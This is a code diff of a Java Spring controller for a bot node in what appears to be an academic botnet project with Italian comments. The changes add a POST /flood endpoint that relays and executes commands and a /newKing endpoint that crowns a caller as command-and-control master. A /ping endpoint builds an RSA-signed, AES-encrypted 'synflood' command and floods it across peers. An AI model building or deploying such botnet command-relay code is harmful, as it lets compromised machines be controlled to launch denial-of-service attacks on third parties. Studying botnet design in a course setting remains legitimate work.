@@ -9,8 +9,10 @@ import javax.servlet.http.HttpServletRequest;
 
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Component;
+import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
+import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
 
 import cs.sii.bot.action.Auth;
@@ -31,7 +33,7 @@ public class BotController {
 
 	@Autowired
 	Auth auth;
-	
+
 	@Autowired
 	CryptoPKI pki;
 
@@ -46,14 +48,36 @@ public class BotController {
 		return "Bot is Ready";
 	}
 
-	@RequestMapping(value="/flood", method = RequestMethod.GET)
-	public Boolean msgFlood() {
+	@RequestMapping(value = "/flood", method = RequestMethod.POST)
+	public Boolean msgFlood(@RequestBody String msg) {
+		bhv.floodAndExecute(msg);
+		return true;
+	}
+
+	@RequestMapping("/newKing")
+	public Boolean newKing(HttpServletRequest req) {
+		if (nServ.isElegible() && (!(engineBot.isCommandandconquerStatus()))) {
+
+			// TODO scegliere quello giusto
+			System.out.println("addr: " + req.getRemoteAddr());
+			System.out.println("host: " + req.getRemoteHost());
+
+			bhv.getPower(req.getRemoteAddr());
+			return true;
+		} else {
+			System.out.println("not elegible or already elected");
+			return false;
+		}
+	}
+
+	@RequestMapping("/ping")
+	public Boolean ping() {
 
 		// per efficienza chiamo un metodo asincrono e rispondo che ho ricevuto
 		// il msg
 		// tutto il resto avviene nella in Flood&Execute
-		
-		String cmd="synflood";
+
+		String cmd = "synflood";
 		String msg = "";
 		// aggiungi nonce time.millis
 		Long milli = System.currentTimeMillis();
@@ -66,40 +90,17 @@ public class BotController {
 		String signature;
 		try {
 			signature = pki.signMessageRSA(hashIdMsg);
-			System.out.println("signature originale "+signature);
+			System.out.println("signature originale " + signature);
 			msg = hashIdMsg + "<HH>" + cmd + "<HH>" + signature;
-			System.out.println("msg originale "+msg);
-			msg=pki.getCrypto().encryptAES(msg);
-			System.out.println("raw originale "+msg);
+			System.out.println("msg originale " + msg);
+			msg = pki.getCrypto().encryptAES(msg);
+			System.out.println("raw originale " + msg);
 		} catch (InvalidKeyException | SignatureException e) {
 			e.printStackTrace();
 			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
 		}
 
-		
-		
 		bhv.floodAndExecute(msg);
-		return true;
-	}
-
-	@RequestMapping("/newKing")
-	public Boolean newKing(HttpServletRequest req) {
-		if (nServ.isElegible()&&(!(engineBot.isCommandandconquerStatus()))) {
-			
-			//TODO scegliere quello giusto
-			System.out.println("addr: "+req.getRemoteAddr());
-			System.out.println("host: "+req.getRemoteHost());
-
-		bhv.getPower(req.getRemoteAddr());
-			return true;
-		} else {
-			System.out.println("not elegible or already elected");
-			return false;
-		}
-	}
-
-	@RequestMapping("/ping")
-	public Boolean ping() {
 		return true;
 	}
 
